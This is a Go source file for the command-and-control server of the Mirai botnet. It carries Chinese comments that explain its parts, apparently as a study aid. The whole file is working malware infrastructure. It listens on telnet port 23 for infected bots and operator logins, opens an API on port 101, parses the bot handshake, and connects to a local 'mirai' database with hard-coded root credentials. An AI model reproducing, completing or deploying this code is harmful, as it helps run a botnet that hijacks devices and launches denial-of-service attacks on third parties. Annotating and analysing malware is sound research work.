package main

import (
	"errors"
	"fmt"
	"net"
	"time"
)

//c&c控制服务器【管理和控制代码】
const DatabaseAddr string = "127.0.0.1"
const DatabaseUser string = "root"
const DatabasePass string = "password"
const DatabaseTable string = "mirai"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable) //建立本地数据库mirai

func main() {
	tel, err := net.Listen("tcp", "0.0.0.0:23") //23用来处理 telnet 登录
	if err != nil {
		fmt.Println(err)
		return
	}

	api, err := net.Listen("tcp", "0.0.0.0:101") //101用作 API 处理。
	if err != nil {
		fmt.Println(err)
		return
	}

	go func() {
		for {
			conn, err := api.Accept() //对101绑定端口进行accept，交由apiHandler处理
			if err != nil {
				break
			}
			go apiHandler(conn)
		}
	}()

	for {
		conn, err := tel.Accept() //对23绑定端口进行accept【mirai bot建立好后，会连接这个23号telnet端口，等待攻击指令。
		if err != nil {
			break
		}
		go initialHandler(conn)
	}

	fmt.Println("Stopped accepting clients")
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			string_len := make([]byte, 1)
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if string_len[0] > 0 {
				source_buf := make([]byte, string_len[0])
				l, err := conn.Read(source_buf)
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			NewBot(conn, buf[3], source).Handle()
		} else {
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		NewAdmin(conn).Handle()
	}
}

func apiHandler(conn net.Conn) {
	defer conn.Close()

	NewApi(conn).Handle() //进入api.go中的Handle函数进行处理
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
